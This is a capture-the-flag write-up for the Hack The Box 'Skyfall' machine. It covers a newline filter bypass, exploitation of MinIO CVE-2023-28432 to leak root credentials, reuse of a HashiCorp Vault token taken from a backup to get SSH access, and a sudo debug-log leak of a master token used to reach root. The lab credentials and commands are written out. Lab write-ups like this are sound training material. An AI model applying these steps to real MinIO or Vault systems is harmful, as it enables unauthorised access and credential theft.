# Skyfall Write-up

<img src="https://labs.hackthebox.com/storage/avatars/e43c6cdfe71e56188e5c2c4f39f5c180.png" width="200" height="200">

## Nmap

 `nmap -sC -sV 10.10.11.254`

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
    |_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    |_http-title: Skyfall - Introducing Sky Storage!
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

skyfall.htb

![image](https://github.com/zer00d4y/writeups/assets/128820441/4bf045f4-8e04-45d1-b4e2-ee9803011ec3)

On the source page, we found the `demo.skyfall.htb` subdomain

![image](https://github.com/zer00d4y/writeups/assets/128820441/4290b0a6-ec98-4422-9775-d6933c0533eb)

demo.skyfall.htb

![image](https://github.com/zer00d4y/writeups/assets/128820441/187c409f-463c-4b81-a55c-b6ba1ead873a)

Demo login: `guest` / `guest` 

![image](https://github.com/zer00d4y/writeups/assets/128820441/49975c2d-f9f4-46b2-99d9-976ebec744fd)

Click to `MinIO Metrics` demo.skyfall.htb/metrics

![image](https://github.com/zer00d4y/writeups/assets/128820441/2c1dc548-86e5-46ef-80af-33c2c4633081)

Try to bypass the filter by using the symbol `%0a` demo.skyfall.htb/metrics%0a

![image](https://github.com/zer00d4y/writeups/assets/128820441/89a39e7d-d94a-460b-b019-6768773246cd)

From here we find the address of the MinIO cluster 

prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster

![image](https://github.com/zer00d4y/writeups/assets/128820441/8de2ded9-d9a5-4243-9082-da94e03d4108)

CVE-2023-28432

https://github.com/acheiii/CVE-2023-28432

Add `/minio/bootstrap/v1/verify` to the cluster link and replace the `GET` request with a `POST` request

![image](https://github.com/zer00d4y/writeups/assets/128820441/d5339767-e86f-4eec-978e-9f92a0a23734)

    {"MinioEndpoints":[{"Legacy":false,"SetCount":1,"DrivesPerSet":4,"Endpoints":[{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node1:9000","Path":"/data1","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node2:9000","Path":"/data1","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node1:9000","Path":"/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node2:9000","Path":"/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true}],"CmdLine":"http://minio-node{1...2}/data{1...2}","Platform":"OS: linux | Arch: amd64"}],"MinioEnv":{"MINIO_ACCESS_KEY_FILE":"access_key","MINIO_BROWSER":"off","MINIO_CONFIG_ENV_FILE":"config.env","MINIO_KMS_SECRET_KEY_FILE":"kms_master_key","MINIO_PROMETHEUS_AUTH_TYPE":"public","MINIO_ROOT_PASSWORD":"GkpjkmiVmpFuL2d3oRx0","MINIO_ROOT_PASSWORD_FILE":"secret_key","MINIO_ROOT_USER":"5GrE1B2YGGyZzNHZaIww","MINIO_ROOT_USER_FILE":"access_key","MINIO_SECRET_KEY_FILE":"secret_key","MINIO_UPDATE":"off","MINIO_UPDATE_MINISIGN_PUBKEY":"RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"}}

Now, we found Minio root user and password

"MINIO_ROOT_USER":"`5GrE1B2YGGyZzNHZaIww`"

"MINIO_ROOT_PASSWORD":"`GkpjkmiVmpFuL2d3oRx0`"

Download and install the minio client: https://min.io/docs/minio/linux/reference/minio-mc.html

    curl https://dl.min.io/client/mc/release/linux-amd64/mc \
      --create-dirs \
      -o $HOME/minio-binaries/mc
      
    chmod +x $HOME/minio-binaries/mc

    export PATH=$PATH:$HOME/minio-binaries/

    mc alias set myminio http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0

    mc admin info myminio

![image](https://github.com/zer00d4y/writeups/assets/128820441/67eab23b-fbcb-4fe8-9b3f-c3c0afa6d9e0)

![image](https://github.com/zer00d4y/writeups/assets/128820441/375604e4-aef4-4f39-9c3d-55152af4c2cd)

Let's list all files with their versions and download the backup file

    mc ls --recursive --versions myminio

![image](https://github.com/zer00d4y/writeups/assets/128820441/b06bc936-1d22-4de6-9723-808f745fb548)

![image](https://github.com/zer00d4y/writeups/assets/128820441/2c5a44e3-2399-4ce9-92be-b4fc04e20007)

cat .bashrc

The `.bashrc` file contains the address and token for Vault

![image](https://github.com/zer00d4y/writeups/assets/128820441/8a2d8bd7-5343-48ce-aed6-3bedbc2ca9c1)

    export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
    export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"

add volt address to /etc/hosts

Download vault 

    wget https://releases.hashicorp.com/vault/1.15.5/vault_1.15.5_linux_amd64.zip
    unzip vault_1.15.5_linux_amd64.zip
    export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
    ./vault login
    hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE
    ./vault token capabilities ssh/roles
    list
    ./vault list ssh/roles

![image](https://github.com/zer00d4y/writeups/assets/128820441/209632af-b0a5-4c06-9398-8b2ca4fb7e5d)

![image](https://github.com/zer00d4y/writeups/assets/128820441/7252b43a-3e8c-47c2-9d30-75e98b967274)

    ./vault ssh -role dev_otp_key_role -mode OTP -strict-host-key-checking=no askyy@10.10.11.254

(askyy@10.10.11.254) Password is OTP session id

![image](https://github.com/zer00d4y/writeups/assets/128820441/92e4a05f-c5c7-4716-b41c-d48fa4bf50b8)

Get the user flag

![image](https://github.com/zer00d4y/writeups/assets/128820441/67def74a-c3ea-49d6-968e-272b94e29153)

## Privilege Escalation

![image](https://github.com/zer00d4y/writeups/assets/128820441/95800080-81e9-4b33-a10c-5a87f57563cf)

    askyy@skyfall:~$ rm -rf debug.log
    askyy@skyfall:~$ touch debug.log
    askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
    [+] Reading: /etc/vault-unseal.yaml
    [-] Security Risk!
    [+] Found Vault node: http://prd23-vault-internal.skyfall.htb
    [>] Check interval: 5s
    [>] Max checks: 5
    [>] Checking seal status
    [+] Vault sealed: false
    askyy@skyfall:~$ cat debug.log
    Initializing logger...
    Reading: /etc/vault-unseal.yaml
    Security Risk!
    Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
    Found Vault node: http://prd23-vault-internal.skyfall.htb
    Check interval: 5s
    Max checks: 5
    Establishing connection to Vault...
    Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
    Checking seal status
    Vault sealed: false
    exit

  connect as root

    export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
    ./vault login 
    hvs.I0ewVsmaKU1SwVZAKR3T0mmG
    ./vault ssh -role admin_otp_key_role -mode OTP -strict-host-key-checking=no root@10.10.11.254
    ./vault ssh -role admin_otp_key_role -mode OTP -strict-host-key-checking=no root@10.10.11.254

![image](https://github.com/zer00d4y/writeups/assets/128820441/6a7611cf-309e-4f93-8e70-17a6d206ec57)

![image](https://github.com/zer00d4y/writeups/assets/128820441/d00a1b26-1498-42a2-974b-e5905899cd92)

Get the root flag 

![image](https://github.com/zer00d4y/writeups/assets/128820441/36125105-82f3-4b0a-87a9-d9a3092522b5)


